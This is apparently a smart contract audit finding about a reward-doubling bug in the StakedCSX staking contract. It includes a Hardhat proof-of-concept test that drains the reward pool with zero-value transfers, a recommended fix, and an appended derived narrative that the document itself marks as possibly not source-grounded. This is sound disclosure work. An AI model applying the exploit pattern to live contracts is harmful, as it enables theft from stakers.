---
id: 7029
severity: "Critical"
---

# Malicious Users Can Steal All Staking Rewards From StakedCSX Due to a Logical Error

## Description

The current implementation of _claimToCredit() function in StakedCSX.sol contract has a logical error in it:
```solidity
(,,uint256 rewardWETH) = rewardOf(_to);
if (rewardWETH > 0) {
    credit[address(TOKEN_WETH)][_to] += rewardWETH;
}
(uint256 rewardUSDC ,,) = rewardOf(_to);
if(rewardUSDC > 0) {
    credit[address(TOKEN_USDC)][_to] += rewardUSDC;
}
(,uint256 rewardUSDT ,) = rewardOf(_to);
if(rewardUSDT > 0) {
    credit[address(TOKEN_USDT)][_to] += rewardUSDT;
}
```
As can be seen, an addition assignment operator is being used on all of the updates to the credit mapping. This is wrong since the current value of the respective credit for each asset is already being added to the reward variables that are retrieved through the StakedCSX::rewardOf() function. This means that on each call to StakedCSX::_claimToCredit(), the credit values are going to get doubled.
```solidity
if(credit[address(TOKEN_WETH)][_account] > 0) {
    wethAmount += credit[address(TOKEN_WETH)][_account];
}
if(credit[address(TOKEN_USDC)][_account] > 0) {
    usdcAmount += credit[address(TOKEN_USDC)][_account];
}
if(credit[address(TOKEN_USDT)][_account] > 0) {
    usdtAmount += credit[address(TOKEN_USDT)][_account];
}
```
And because StakedCSX::_claimToCredit() is being called in the StakedCSX::_beforeTokenTransfer() callback, this error can easily be abused to infinitely double the reward credits of a given user by simply making zero value StakedCSX token transfers.

Malicious stakes can easily drain all of the staking rewards from the StakedCSX.sol contract, making the contract insolvent and leaving other stakes empty-handed.

## Proof of Concept

In the following test, it can be seen how a user who is entitled to only 1/8 of the staking rewards is able to claim all of them, using the above-described vulnerability:
```solidity
it("should double the reward of a given user on each token transfer",
async () => {
    const amount1 = ethers.parseEther("500"); // 1/8 of underlying supply
    const amount2 = ethers.parseEther("3500"); // 7/8 of underlying supply
    const distributeAmount = ethers.parseUnits("500", 6);
    await CSXToken.connect(deployer).transfer(user1.getAddress(), amount1);
    await CSXToken.connect(deployer).transfer(user2.getAddress(), amount2);
    await CSXToken.connect(user1).approve(staking.target , amount1);
    await CSXToken.connect(user2).approve(staking.target , amount2);
    await staking.connect(user1).stake(amount1);
    await staking.connect(user2).stake(amount2);
    await USDCToken.connect(deployer).approve(staking.target ,
    distributeAmount);
    await staking
    .connect(deployer)
    .depositDividend(USDCToken.target , distributeAmount);
    await staking.connect(keeperNode).distribute(true, true, true);
    // credit[USDC][user1] = 0 => rewardOf(user1) = 500
    const initialReward = await staking.rewardOf(user1.getAddress());
    await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));
    // credit[USDC][user1] = 500 => rewardOf(user1) = 500
    await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));
    // credit[USDC][user1] = 1000 => rewardOf(user1) = 1000
    await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));
    // credit[USDC][user1] = 2000 => rewardOf(user1) = 2000
    await staking
    .connect(user1)
    .transfer("0x0000000000000000000000000000000000000001", BigInt(0));
    // credit[USDC][user1] = 4000 => rewardOf(user1) = 4000
    const postTransferReward = await staking.rewardOf(user1.getAddress());
    console.log("> Initial reward: ", initialReward.usdcAmount);
    console.log("> Reward after 4 transfers: ", postTransferReward.usdcAmount
    );
    expect(postTransferReward.usdcAmount).to.equal(
        initialReward.usdcAmount * BigInt(8)
    );
    const usdcBalanceBefore = await USDCToken.balanceOf(staking.getAddress())
    ;
    await staking.connect(user1).claim(true, false, false, false);
    const usdcBalanceAfter = await USDCToken.balanceOf(staking.getAddress());
    console.log("> USDC balalance before claim: ", usdcBalanceBefore);
    console.log("> USDC balalance after claim: ", usdcBalanceAfter);
    expect(usdcBalanceAfter).to.equal(0);
});
```
To run the PoC test, add it to the Staking describe block of the StakedCSX.test.ts file and then run npx hardhat test --grep "should double the reward of a given user on each token transfer" in the project root directory.

## Recommendation

To address this vulnerability, replace the addition assignment operators with plain assignment operators:
```solidity
function _claimToCredit(address _to) private {
    if(balanceOf(_to) != 0) {
        (,,uint256 rewardWETH) = rewardOf(_to);
        if (rewardWETH > 0) {
            - credit[address(TOKEN_WETH)][_to] += rewardWETH;
            + credit[address(TOKEN_WETH)][_to] = rewardWETH;
        }
        (uint256 rewardUSDC ,,) = rewardOf(_to);
        if(rewardUSDC > 0) {
            - credit[address(TOKEN_USDC)][_to] += rewardUSDC;
            + credit[address(TOKEN_USDC)][_to] = rewardUSDC;
        }
        (,uint256 rewardUSDT ,) = rewardOf(_to);
        if(rewardUSDT > 0) {
            - credit[address(TOKEN_USDT)][_to] += rewardUSDT;
            + credit[address(TOKEN_USDT)][_to] = rewardUSDT;
        }
    }
    _updateRewardRate(_to, address(TOKEN_WETH));
    _updateRewardRate(_to, address(TOKEN_USDC));
    _updateRewardRate(_to, address(TOKEN_USDT));
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a logical error in the reward‑crediting routine of the StakedCSX contract. When the private function _claimToCredit is executed, it retrieves the pending reward amounts for each supported asset (WETH, USDC, USDT) via rewardOf and then adds those amounts to a per‑account credit mapping using the += operator. Because the credit mapping already contains the previously claimed reward, the addition effectively doubles the stored credit on every invocation. The function _claimToCredit is called from the _beforeTokenTransfer hook, which is triggered on any token transfer, including transfers of zero value. Consequently, a malicious user can repeatedly perform zero‑value transfers of the StakedCSX token, causing the credit for that account to double each time. Over a few iterations the credit grows exponentially, allowing the attacker to claim an amount far larger than their proportional share and ultimately drain all staking rewards from the contract. The impact is that the reward pool becomes empty, honest stakers receive no dividends, and the contract may become insolvent. The bug occurs whenever an account with a non‑zero balance initiates a transfer, even if the transferred amount is zero, because the hook does not check the transfer amount before calling _claimToCredit. The affected parties are all participants in the staking protocol, including token holders and the protocol itself, which loses the economic incentive mechanism. The issue was discovered during a manual audit and reproduced with a proof‑of‑concept test that showed a user entitled to only one‑eighth of the rewards being able to claim the entire pool after a few zero‑value transfers. The problem is subtle because zero‑value transfers appear harmless in the UI and the credit values increase in a way that seems consistent with reward accrual, making the bug hard to notice without inspecting the internal accounting logic. The correct mitigation is to replace the addition assignment (+=) with a plain assignment (=) when writing the reward amounts to the credit mapping, ensuring that each credit entry reflects only the newly calculated reward rather than the sum of the old credit and the new reward. This change restores the intended accounting model where rewards are allocated proportionally and prevents any user from artificially inflating their claim.
